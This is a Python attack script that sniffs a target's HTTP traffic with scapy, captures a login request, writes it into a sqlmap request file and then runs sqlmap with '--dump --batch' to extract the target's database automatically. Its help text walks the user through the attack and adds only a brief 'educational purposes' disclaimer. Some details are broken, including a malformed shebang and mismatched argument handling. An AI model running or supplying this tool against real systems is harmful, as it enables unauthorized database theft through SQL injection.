#!/bin/p3

import scapy.all as sc
import base64
import os
import sys

def decode_request(packet):

    # Decode the request payload into a string
    dec_packet =  packet.load.decode()
    #Create empty dict that will store all request params
    load_dict = {}

    # Split body and change it to a dictionary so that all parameters can be easily acessible
    for i,x in enumerate(dec_packet.split('\n')[1:-2]):
        splitted = x.split()
        load_dict[splitted[0]] = " ".join(splitted[1:])

    # Return all params
    return dec_packet.split('\n')[0], dec_packet.split('\n')[1:-2], dec_packet.split('\n')[-1], load_dict
#
def save_to_sqlmapfile(dec_header, dec_res, load_dict, packet):
    url = load_dict['Referer:']
    ip = load_dict['Host:']
    method = dec_header.split()[0]
    path = dec_header.split()[1]
    extension = "php"
    load_b64 = base64.b64encode(packet).decode()

    file_sqlmap = open('sqlmap_params.xml','w+')
    file_sqlmap.write(sqlmap_string.format(url, ip, port, method, path, extension, load_b64))
    file_sqlmap.close()

if __name__ == "__main__":

    # Default settings
    port = 80
    packets_count = 5
    ip_address = '127.0.0.1'
    path_to_sqlmap='/usr/local/lib/python3.7/dist-packages/sqlmap/sqlmap.py'
    sqlmap_string ="""
    <item>
        <url><![CDATA[{0}]]></url>
        <host ip="{1}">{1}</host>
        <port>{2}</port>
        <protocol>http</protocol>
        <method><![CDATA[{3}]]></method>
        <path><![CDATA[{4}]]></path>
        <extension>{5}</extension>
        <request base64="true"><![CDATA[{6}]]></request>
    </item>
    """
    #

    # Check whether all args were supplied
    if len(sys.argv) == 1:
        print("usage: ./hostscan.py <target_ip>  (Use -h for help and additional arguments)")
        exit()

    if len(sys.argv) >= 2:
        ip_address = sys.argv[1]

    if len(sys.argv) >= 3:
        packets_count = sys.argv[2]

    if len(sys.argv) >= 4:
        path_to_sqlmap = sys.argv[3]

    # Optionally, print help
    if sys.argv[1] == '-h':
        print("""
        <target_port> (default 80) ----> port on which application is running
        <packet_count> (default 5) ----> how many packets intercept (advanced)
        <path to sqlmap> (just run command #find / -name sqlmap.py and paste any of outputted paths if script doesn't work)

        Extented usage would look as follows:
        /hostscan.py <target_ip> <target_port> <packet_count> <path to sqlmap>

        If you run this script 1-st time, do as follows:
        1. Run this script in a terminal
        2. Open page where you want to use sql injection
        3. Type any credentials, log in
        4. Now this script will do the rest for you. You can ocassionally check if sqlmap_param
           itself has any questions, otherwise sit, relax and wait for the database dump!

        (only for educational purposes)
        """)
        exit()


    #Starting sniffing the network in scapy
    print("Sniffing on the go, now access vulnerable webpage and do the job.")
    results = sc.sniff(filter="dst net "+ip_address, count=packets_count)

    #Create table of intercepted packets
    r_table = []
    load_index = 0
    for i,x in enumerate(results):
        r_table.append(x.summary())
        #Check which packet contains the HTTP request
        if 'Raw' in x.summary(): load_index = i

    #Decode intercepted packet into easily accessible set of variables
    dec_header,dec_res,dec_param,load_dict = decode_request(results[load_index])

    #Save parameters into a new file with format acceptable by sqlmap
    save_to_sqlmapfile(dec_header, dec_res, load_dict, results[load_index].load)

    #Possible sqlmap paths:
    # /usr/share/sqlmap/sqlmap.py
    # /usr/share/golismero/plugins/testing/attack/sqlmap.py
    # /usr/share/golismero/tools/sqlmap/sqlmap.py
    # /usr/local/lib/python3.7/dist-packages/sqlmap/sqlmap.py

    #Finally run sqlinjection with all parameters (note - sqlmap_params.xml has automatically been written to before)
    os.system(path_to_sqlmap+' -r sqlmap_params.xml --dump --batch --answer="redirect=N"')
#
